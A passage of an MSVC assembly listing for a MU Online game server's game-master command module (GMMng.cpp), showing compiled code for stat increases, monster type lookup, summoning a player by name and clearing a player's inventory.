  000cb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ce	0f b7 88 b4 00
	00 00		 movzx	 ecx, WORD PTR [eax+180]
  000d5	8b 15 98 00 00
	00		 mov	 edx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  000db	2b d1		 sub	 edx, ecx
  000dd	89 55 0c	 mov	 DWORD PTR _Points$[ebp], edx

; 4825 : 
; 4826 : 				if(Points <= 0)

  000e0	83 7d 0c 00	 cmp	 DWORD PTR _Points$[ebp], 0
  000e4	7f 05		 jg	 SHORT $LN10@IncreaseSt

; 4827 : 					return;

  000e6	e9 76 01 00 00	 jmp	 $LN1@IncreaseSt
$LN10@IncreaseSt:

; 4828 : 			}
; 4829 : 
; 4830 : 			lpObj->Strength += Points;

  000eb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ee	0f b7 88 b4 00
	00 00		 movzx	 ecx, WORD PTR [eax+180]
  000f5	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  000f8	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  000fb	66 89 8a b4 00
	00 00		 mov	 WORD PTR [edx+180], cx

; 4831 : 		}
; 4832 : 		break;

  00102	e9 39 01 00 00	 jmp	 $LN2@IncreaseSt
$LN12@IncreaseSt:

; 4833 : 	case IS_DEXTERITY:
; 4834 : 		{
; 4835 : 			if(lpObj->Dexterity+Points > g_GlobalConfig.m_iMax_Stats)

  00107	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0010a	0f b7 88 b6 00
	00 00		 movzx	 ecx, WORD PTR [eax+182]
  00111	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  00114	3b 0d 98 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0011a	7e 20		 jle	 SHORT $LN13@IncreaseSt

; 4836 : 			{
; 4837 : 				Points = g_GlobalConfig.m_iMax_Stats - lpObj->Dexterity;

  0011c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0011f	0f b7 88 b6 00
	00 00		 movzx	 ecx, WORD PTR [eax+182]
  00126	8b 15 98 00 00
	00		 mov	 edx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0012c	2b d1		 sub	 edx, ecx
  0012e	89 55 0c	 mov	 DWORD PTR _Points$[ebp], edx

; 4838 : 
; 4839 : 				if(Points <= 0)

  00131	83 7d 0c 00	 cmp	 DWORD PTR _Points$[ebp], 0
  00135	7f 05		 jg	 SHORT $LN13@IncreaseSt

; 4840 : 					return;

  00137	e9 25 01 00 00	 jmp	 $LN1@IncreaseSt
$LN13@IncreaseSt:

; 4841 : 			}
; 4842 : 
; 4843 : 			lpObj->Dexterity += Points;

  0013c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0013f	0f b7 88 b6 00
	00 00		 movzx	 ecx, WORD PTR [eax+182]
  00146	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  00149	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0014c	66 89 8a b6 00
	00 00		 mov	 WORD PTR [edx+182], cx

; 4844 : 		}
; 4845 : 		break;

  00153	e9 e8 00 00 00	 jmp	 $LN2@IncreaseSt
$LN15@IncreaseSt:

; 4846 : 	case IS_VITALITY:
; 4847 : 		{
; 4848 : 			if(lpObj->Vitality+Points > g_GlobalConfig.m_iMax_Stats)

  00158	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0015b	0f b7 88 b8 00
	00 00		 movzx	 ecx, WORD PTR [eax+184]
  00162	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  00165	3b 0d 98 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0016b	7e 20		 jle	 SHORT $LN16@IncreaseSt

; 4849 : 			{
; 4850 : 				Points = g_GlobalConfig.m_iMax_Stats - lpObj->Vitality;

  0016d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00170	0f b7 88 b8 00
	00 00		 movzx	 ecx, WORD PTR [eax+184]
  00177	8b 15 98 00 00
	00		 mov	 edx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0017d	2b d1		 sub	 edx, ecx
  0017f	89 55 0c	 mov	 DWORD PTR _Points$[ebp], edx

; 4851 : 
; 4852 : 				if(Points <= 0)

  00182	83 7d 0c 00	 cmp	 DWORD PTR _Points$[ebp], 0
  00186	7f 05		 jg	 SHORT $LN16@IncreaseSt

; 4853 : 					return;

  00188	e9 d4 00 00 00	 jmp	 $LN1@IncreaseSt
$LN16@IncreaseSt:

; 4854 : 			}
; 4855 : 
; 4856 : 			lpObj->Vitality += Points;

  0018d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00190	0f b7 88 b8 00
	00 00		 movzx	 ecx, WORD PTR [eax+184]
  00197	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  0019a	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0019d	66 89 8a b8 00
	00 00		 mov	 WORD PTR [edx+184], cx

; 4857 : 		}
; 4858 : 		break;

  001a4	e9 97 00 00 00	 jmp	 $LN2@IncreaseSt
$LN18@IncreaseSt:

; 4859 : 	case IS_ENERGY:
; 4860 : 		{
; 4861 : 			if(lpObj->Energy+Points > g_GlobalConfig.m_iMax_Stats)

  001a9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001ac	0f b7 88 ba 00
	00 00		 movzx	 ecx, WORD PTR [eax+186]
  001b3	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  001b6	3b 0d 98 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  001bc	7e 20		 jle	 SHORT $LN19@IncreaseSt

; 4862 : 			{
; 4863 : 				Points = g_GlobalConfig.m_iMax_Stats - lpObj->Energy;

  001be	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001c1	0f b7 88 ba 00
	00 00		 movzx	 ecx, WORD PTR [eax+186]
  001c8	8b 15 98 00 00
	00		 mov	 edx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  001ce	2b d1		 sub	 edx, ecx
  001d0	89 55 0c	 mov	 DWORD PTR _Points$[ebp], edx

; 4864 : 
; 4865 : 				if(Points <= 0)

  001d3	83 7d 0c 00	 cmp	 DWORD PTR _Points$[ebp], 0
  001d7	7f 05		 jg	 SHORT $LN19@IncreaseSt

; 4866 : 					return;

  001d9	e9 83 00 00 00	 jmp	 $LN1@IncreaseSt
$LN19@IncreaseSt:

; 4867 : 			}
; 4868 : 
; 4869 : 			lpObj->Energy += Points;

  001de	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001e1	0f b7 88 ba 00
	00 00		 movzx	 ecx, WORD PTR [eax+186]
  001e8	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  001eb	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  001ee	66 89 8a ba 00
	00 00		 mov	 WORD PTR [edx+186], cx

; 4870 : 		}
; 4871 : 		break;

  001f5	eb 49		 jmp	 SHORT $LN2@IncreaseSt
$LN21@IncreaseSt:

; 4872 : #ifdef DARKLORD_WORK
; 4873 : 	case IS_COMMAND:
; 4874 : 		{
; 4875 : 			if(lpObj->Leadership+Points > g_GlobalConfig.m_iMax_Stats)

  001f7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001fa	0f b7 88 d8 00
	00 00		 movzx	 ecx, WORD PTR [eax+216]
  00201	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  00204	3b 0d 98 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0020a	7e 1d		 jle	 SHORT $LN22@IncreaseSt

; 4876 : 			{
; 4877 : 				Points = g_GlobalConfig.m_iMax_Stats - lpObj->Leadership;

  0020c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0020f	0f b7 88 d8 00
	00 00		 movzx	 ecx, WORD PTR [eax+216]
  00216	8b 15 98 00 00
	00		 mov	 edx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  0021c	2b d1		 sub	 edx, ecx
  0021e	89 55 0c	 mov	 DWORD PTR _Points$[ebp], edx

; 4878 : 
; 4879 : 				if(Points <= 0)

  00221	83 7d 0c 00	 cmp	 DWORD PTR _Points$[ebp], 0
  00225	7f 02		 jg	 SHORT $LN22@IncreaseSt

; 4880 : 					return;

  00227	eb 38		 jmp	 SHORT $LN1@IncreaseSt
$LN22@IncreaseSt:

; 4881 : 			}
; 4882 : 
; 4883 : 			lpObj->Leadership += Points;

  00229	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0022c	0f b7 88 d8 00
	00 00		 movzx	 ecx, WORD PTR [eax+216]
  00233	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  00236	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  00239	66 89 8a d8 00
	00 00		 mov	 WORD PTR [edx+216], cx
$LN2@IncreaseSt:

; 4884 : 		}
; 4885 : 		break;
; 4886 : #endif
; 4887 : 	}
; 4888 : 
; 4889 : 	lpObj->LevelUpPoint -= Points;

  00240	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00243	8b 88 a4 00 00
	00		 mov	 ecx, DWORD PTR [eax+164]
  00249	2b 4d 0c	 sub	 ecx, DWORD PTR _Points$[ebp]
  0024c	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0024f	89 8a a4 00 00
	00		 mov	 DWORD PTR [edx+164], ecx

; 4890 : 
; 4891 : 	ResetViewport(lpObj);

  00255	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00258	50		 push	 eax
  00259	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0025c	e8 00 00 00 00	 call	 ?ResetViewport@CGMMng@@QAEXPAVOBJECTSTRUCT@@@Z ; CGMMng::ResetViewport
$LN1@IncreaseSt:

; 4892 : }

  00261	5f		 pop	 edi
  00262	5e		 pop	 esi
  00263	5b		 pop	 ebx
  00264	8b e5		 mov	 esp, ebp
  00266	5d		 pop	 ebp
  00267	c2 0c 00	 ret	 12			; 0000000cH
  0026a	66 90		 npad	 2
$LN25@IncreaseSt:
  0026c	00 00 00 00	 DD	 $LN9@IncreaseSt
  00270	00 00 00 00	 DD	 $LN12@IncreaseSt
  00274	00 00 00 00	 DD	 $LN15@IncreaseSt
  00278	00 00 00 00	 DD	 $LN18@IncreaseSt
  0027c	00 00 00 00	 DD	 $LN21@IncreaseSt
?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ENDP ; CGMMng::IncreaseStat
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_GetObjectType@CGMMng@@AAEHG@Z
_TEXT	SEGMENT
_lpObj$1 = -16						; size = 4
_i$2 = -12						; size = 4
_wType$ = -8						; size = 2
_this$ = -4						; size = 4
_wClass$ = 8						; size = 2
?_GetObjectType@CGMMng@@AAEHG@Z PROC			; CGMMng::_GetObjectType, COMDAT
; _this$ = ecx

; 4773 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4774 : 	WORD wType = 255;

  0000c	b8 ff 00 00 00	 mov	 eax, 255		; 000000ffH
  00011	66 89 45 f8	 mov	 WORD PTR _wType$[ebp], ax

; 4775 : 
; 4776 : 	for( int i=0; i<MAX_MONSTER; ++i )

  00015	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR _i$2[ebp], 0
  0001c	eb 09		 jmp	 SHORT $LN4@GetObjectT
$LN2@GetObjectT:
  0001e	8b 45 f4	 mov	 eax, DWORD PTR _i$2[ebp]
  00021	83 c0 01	 add	 eax, 1
  00024	89 45 f4	 mov	 DWORD PTR _i$2[ebp], eax
$LN4@GetObjectT:
  00027	81 7d f4 a8 16
	00 00		 cmp	 DWORD PTR _i$2[ebp], 5800 ; 000016a8H
  0002e	7d 35		 jge	 SHORT $LN3@GetObjectT

; 4777 : 	{
; 4778 : 		LPOBJECTSTRUCT lpObj = &gObj[i];

  00030	69 45 f4 a0 1b
	00 00		 imul	 eax, DWORD PTR _i$2[ebp], 7072
  00037	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0003d	89 45 f0	 mov	 DWORD PTR _lpObj$1[ebp], eax

; 4779 : 		if (lpObj == NULL)

  00040	75 02		 jne	 SHORT $LN5@GetObjectT

; 4780 : 			continue;

  00042	eb da		 jmp	 SHORT $LN2@GetObjectT
$LN5@GetObjectT:

; 4781 : 
; 4782 : 		if (lpObj->Class == wClass)

  00044	8b 45 f0	 mov	 eax, DWORD PTR _lpObj$1[ebp]
  00047	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0004e	0f b7 55 08	 movzx	 edx, WORD PTR _wClass$[ebp]
  00052	3b ca		 cmp	 ecx, edx
  00054	75 0d		 jne	 SHORT $LN6@GetObjectT

; 4783 : 		{
; 4784 : 			wType = lpObj->Type;

  00056	8b 45 f0	 mov	 eax, DWORD PTR _lpObj$1[ebp]
  00059	66 8b 48 64	 mov	 cx, WORD PTR [eax+100]
  0005d	66 89 4d f8	 mov	 WORD PTR _wType$[ebp], cx

; 4785 : 			break;

  00061	eb 02		 jmp	 SHORT $LN3@GetObjectT
$LN6@GetObjectT:

; 4786 : 		}
; 4787 : 	}

  00063	eb b9		 jmp	 SHORT $LN2@GetObjectT
$LN3@GetObjectT:

; 4788 : 
; 4789 : 	return wType;

  00065	0f b7 45 f8	 movzx	 eax, WORD PTR _wType$[ebp]

; 4790 : }

  00069	5f		 pop	 edi
  0006a	5e		 pop	 esi
  0006b	5b		 pop	 ebx
  0006c	8b e5		 mov	 esp, ebp
  0006e	5d		 pop	 ebp
  0006f	c2 04 00	 ret	 4
?_GetObjectType@CGMMng@@AAEHG@Z ENDP			; CGMMng::_GetObjectType
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_SummonCharacter@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z
_TEXT	SEGMENT
_byMapAttr$ = -285					; size = 1
_nY$ = -284						; size = 4
_nX$ = -280						; size = 4
_nMapNumber$ = -276					; size = 4
_szMsg$ = -272						; size = 256
_nIndex$ = -16						; size = 4
_lpTargetObj$ = -12					; size = 4
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_lpszName$ = 12						; size = 4
?_SummonCharacter@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z PROC ; CGMMng::_SummonCharacter, COMDAT
; _this$ = ecx

; 4746 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 60 01 00
	00		 sub	 esp, 352		; 00000160H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4747 : 	LPOBJECTSTRUCT lpTargetObj = NULL;

  00019	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR _lpTargetObj$[ebp], 0

; 4748 : 	int nIndex = -1;

  00020	c7 45 f0 ff ff
	ff ff		 mov	 DWORD PTR _nIndex$[ebp], -1

; 4749 : 	char szMsg[256];
; 4750 : 	ZeroMemory(szMsg, 256);

  00027	68 00 01 00 00	 push	 256			; 00000100H
  0002c	6a 00		 push	 0
  0002e	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00034	50		 push	 eax
  00035	e8 00 00 00 00	 call	 _memset
  0003a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4751 : 	
; 4752 : 	ERROR_RETURN(lpszName, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0003d	83 7d 0c 00	 cmp	 DWORD PTR _lpszName$[ebp], 0
  00041	75 1a		 jne	 SHORT $LN2@SummonChar
  00043	6a 01		 push	 1
  00045	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00048	8b 08		 mov	 ecx, DWORD PTR [eax]
  0004a	51		 push	 ecx
  0004b	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  00050	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00055	83 c4 0c	 add	 esp, 12			; 0000000cH
  00058	e9 3c 01 00 00	 jmp	 $LN1@SummonChar
$LN2@SummonChar:

; 4753 : 	
; 4754 : 	nIndex = gObjGetIndex( const_cast<LPSTR>(lpszName) );

  0005d	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  00060	50		 push	 eax
  00061	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  00066	83 c4 04	 add	 esp, 4
  00069	89 45 f0	 mov	 DWORD PTR _nIndex$[ebp], eax

; 4755 : 	ERROR_RETURN(nIndex > 0, GCServerMsgStringSend("Result-User Not Found", lpObj->m_Index, 1) );

  0006c	83 7d f0 00	 cmp	 DWORD PTR _nIndex$[ebp], 0
  00070	7f 1a		 jg	 SHORT $LN3@SummonChar
  00072	6a 01		 push	 1
  00074	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00077	8b 08		 mov	 ecx, DWORD PTR [eax]
  00079	51		 push	 ecx
  0007a	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@
  0007f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00084	83 c4 0c	 add	 esp, 12			; 0000000cH
  00087	e9 0d 01 00 00	 jmp	 $LN1@SummonChar
$LN3@SummonChar:

; 4756 : 	ERROR_RETURN(gObj[nIndex].Connected==CSS_GAMEPLAYING, GCServerMsgStringSend("Result-Disconnect User", lpObj->m_Index, 1) );

  0008c	69 45 f0 a0 1b
	00 00		 imul	 eax, DWORD PTR _nIndex$[ebp], 7072
  00093	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00099	83 7c 01 04 03	 cmp	 DWORD PTR [ecx+eax+4], 3
  0009e	74 1a		 je	 SHORT $LN4@SummonChar
  000a0	6a 01		 push	 1
  000a2	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000a5	8b 08		 mov	 ecx, DWORD PTR [eax]
  000a7	51		 push	 ecx
  000a8	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@FOCDIHKG@Result?9Disconnect?5User@
  000ad	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000b2	83 c4 0c	 add	 esp, 12			; 0000000cH
  000b5	e9 df 00 00 00	 jmp	 $LN1@SummonChar
$LN4@SummonChar:

; 4757 : 
; 4758 : 
; 4759 : 	int nMapNumber = lpObj->MapNumber;

  000ba	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000bd	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  000c4	89 8d ec fe ff
	ff		 mov	 DWORD PTR _nMapNumber$[ebp], ecx

; 4760 : 	int nX = lpObj->X + 1;

  000ca	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000cd	0f bf 88 04 01
	00 00		 movsx	 ecx, WORD PTR [eax+260]
  000d4	83 c1 01	 add	 ecx, 1
  000d7	89 8d e8 fe ff
	ff		 mov	 DWORD PTR _nX$[ebp], ecx

; 4761 : 	int nY = lpObj->Y + 1;

  000dd	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000e0	0f bf 88 06 01
	00 00		 movsx	 ecx, WORD PTR [eax+262]
  000e7	83 c1 01	 add	 ecx, 1
  000ea	89 8d e4 fe ff
	ff		 mov	 DWORD PTR _nY$[ebp], ecx

; 4762 : 	BYTE byMapAttr = MapC[nMapNumber].GetAttr(nX, nY);

  000f0	8b 85 e4 fe ff
	ff		 mov	 eax, DWORD PTR _nY$[ebp]
  000f6	50		 push	 eax
  000f7	8b 8d e8 fe ff
	ff		 mov	 ecx, DWORD PTR _nX$[ebp]
  000fd	51		 push	 ecx
  000fe	69 8d ec fe ff
	ff 8c 04 05 00	 imul	 ecx, DWORD PTR _nMapNumber$[ebp], 328844
  00108	03 0d 00 00 00
	00		 add	 ecx, DWORD PTR ?MapC@@3PAVMapClass@@A ; MapC
  0010e	e8 00 00 00 00	 call	 ?GetAttr@MapClass@@QAEEHH@Z ; MapClass::GetAttr
  00113	88 85 e3 fe ff
	ff		 mov	 BYTE PTR _byMapAttr$[ebp], al

; 4763 : 	ERROR_RETURN(!((byMapAttr&MAP_ATTR_BLOCK)==MAP_ATTR_BLOCK) && !((byMapAttr&MAP_ATTR_HOLLOW)==MAP_ATTR_HOLLOW)

  00119	0f b6 85 e3 fe
	ff ff		 movzx	 eax, BYTE PTR _byMapAttr$[ebp]
  00120	83 e0 04	 and	 eax, 4
  00123	75 0c		 jne	 SHORT $LN6@SummonChar
  00125	0f b6 85 e3 fe
	ff ff		 movzx	 eax, BYTE PTR _byMapAttr$[ebp]
  0012c	83 e0 08	 and	 eax, 8
  0012f	74 17		 je	 SHORT $LN5@SummonChar
$LN6@SummonChar:
  00131	6a 01		 push	 1
  00133	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00136	8b 08		 mov	 ecx, DWORD PTR [eax]
  00138	51		 push	 ecx
  00139	68 00 00 00 00	 push	 OFFSET ??_C@_0BE@CJMFLBBF@Result?9Invalid?5Area@
  0013e	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00143	83 c4 0c	 add	 esp, 12			; 0000000cH
  00146	eb 51		 jmp	 SHORT $LN1@SummonChar
$LN5@SummonChar:

; 4764 : 		, GCServerMsgStringSend("Result-Invalid Area", lpObj->m_Index, 1) );
; 4765 : 
; 4766 : 	wsprintf(szMsg, "Result-SummonCharacter(%s)", lpszName);

  00148	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  0014b	50		 push	 eax
  0014c	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@FBKFECEH@Result?9SummonCharacter?$CI?$CFs?$CJ@
  00151	8d 8d f0 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  00157	51		 push	 ecx
  00158	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  0015e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4767 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  00161	6a 01		 push	 1
  00163	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00166	8b 08		 mov	 ecx, DWORD PTR [eax]
  00168	51		 push	 ecx
  00169	8d 95 f0 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  0016f	52		 push	 edx
  00170	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00175	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4768 : 
; 4769 : 	gObjTeleport(nIndex, nMapNumber, nX, nY);

  00178	8b 85 e4 fe ff
	ff		 mov	 eax, DWORD PTR _nY$[ebp]
  0017e	50		 push	 eax
  0017f	8b 8d e8 fe ff
	ff		 mov	 ecx, DWORD PTR _nX$[ebp]
  00185	51		 push	 ecx
  00186	8b 95 ec fe ff
	ff		 mov	 edx, DWORD PTR _nMapNumber$[ebp]
  0018c	52		 push	 edx
  0018d	8b 45 f0	 mov	 eax, DWORD PTR _nIndex$[ebp]
  00190	50		 push	 eax
  00191	e8 00 00 00 00	 call	 ?gObjTeleport@@YAXHHHH@Z ; gObjTeleport
  00196	83 c4 10	 add	 esp, 16			; 00000010H
$LN1@SummonChar:

; 4770 : }

  00199	5f		 pop	 edi
  0019a	5e		 pop	 esi
  0019b	5b		 pop	 ebx
  0019c	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0019f	33 cd		 xor	 ecx, ebp
  001a1	e8 00 00 00 00	 call	 @__security_check_cookie@4
  001a6	8b e5		 mov	 esp, ebp
  001a8	5d		 pop	 ebp
  001a9	c2 08 00	 ret	 8
?_SummonCharacter@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ENDP ; CGMMng::_SummonCharacter
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_ClearInven@CGMMng@@AAEXPAVOBJECTSTRUCT@@@Z
_TEXT	SEGMENT
_i$1 = -272						; size = 4
_nCount$ = -268						; size = 4
_szMsg$ = -264						; size = 256
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
?_ClearInven@CGMMng@@AAEXPAVOBJECTSTRUCT@@@Z PROC	; CGMMng::_ClearInven, COMDAT
; _this$ = ecx

; 4721 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 50 01 00
	00		 sub	 esp, 336		; 00000150H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4722 : 	char szMsg[256];
; 4723 : 	ZeroMemory(szMsg, 256);

  00019	68 00 01 00 00	 push	 256			; 00000100H
  0001e	6a 00		 push	 0
  00020	8d 85 f8 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00026	50		 push	 eax
  00027	e8 00 00 00 00	 call	 _memset
  0002c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4724 : 
; 4725 : 	int nCount = 0;

  0002f	c7 85 f4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _nCount$[ebp], 0

; 4726 : #ifdef GMCOMMAND_EX_1ST_BUGFIX
; 4727 : 	for( int i=MAX_EQUIPMENT; i<MAX_INVENTORY; i++ )
; 4728 : #else
; 4729 : 	for( int i=MAX_EQUIPMENT; i<MAX_INVENTORY-1; i++ )

  00039	c7 85 f0 fe ff
	ff 0c 00 00 00	 mov	 DWORD PTR _i$1[ebp], 12	; 0000000cH
  00043	eb 0f		 jmp	 SHORT $LN4@ClearInven
$LN2@ClearInven:
  00045	8b 85 f0 fe ff
	ff		 mov	 eax, DWORD PTR _i$1[ebp]
  0004b	83 c0 01	 add	 eax, 1
  0004e	89 85 f0 fe ff
	ff		 mov	 DWORD PTR _i$1[ebp], eax
$LN4@ClearInven:
  00054	83 bd f0 fe ff
	ff 4b		 cmp	 DWORD PTR _i$1[ebp], 75	; 0000004bH
  0005b	7d 43		 jge	 SHORT $LN3@ClearInven

; 4730 : #endif // GMCOMMAND_EX_1ST_BUGFIX
; 4731 : 	{
; 4732 : 		if( lpObj->pInventory[i].IsItem() == TRUE )

  0005d	69 8d f0 fe ff
	ff a8 00 00 00	 imul	 ecx, DWORD PTR _i$1[ebp], 168
  00067	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0006a	03 88 5c 0c 00
	00		 add	 ecx, DWORD PTR [eax+3164]
  00070	e8 00 00 00 00	 call	 ?IsItem@CItem@@QAEHXZ	; CItem::IsItem
  00075	83 f8 01	 cmp	 eax, 1
  00078	75 24		 jne	 SHORT $LN5@ClearInven

; 4733 : 		{
; 4734 : 			gObjInventoryDeleteItem( lpObj->m_Index, i );

  0007a	8b 85 f0 fe ff
	ff		 mov	 eax, DWORD PTR _i$1[ebp]
  00080	50		 push	 eax
  00081	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  00084	8b 11		 mov	 edx, DWORD PTR [ecx]
  00086	52		 push	 edx
  00087	e8 00 00 00 00	 call	 ?gObjInventoryDeleteItem@@YAEHH@Z ; gObjInventoryDeleteItem
  0008c	83 c4 08	 add	 esp, 8

; 4735 : 			++nCount;

  0008f	8b 85 f4 fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  00095	83 c0 01	 add	 eax, 1
  00098	89 85 f4 fe ff
	ff		 mov	 DWORD PTR _nCount$[ebp], eax
$LN5@ClearInven:

; 4736 : 		}
; 4737 : 	}

  0009e	eb a5		 jmp	 SHORT $LN2@ClearInven
$LN3@ClearInven:

; 4738 : 	GCItemListSend( lpObj->m_Index );

  000a0	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000a3	8b 08		 mov	 ecx, DWORD PTR [eax]
  000a5	51		 push	 ecx
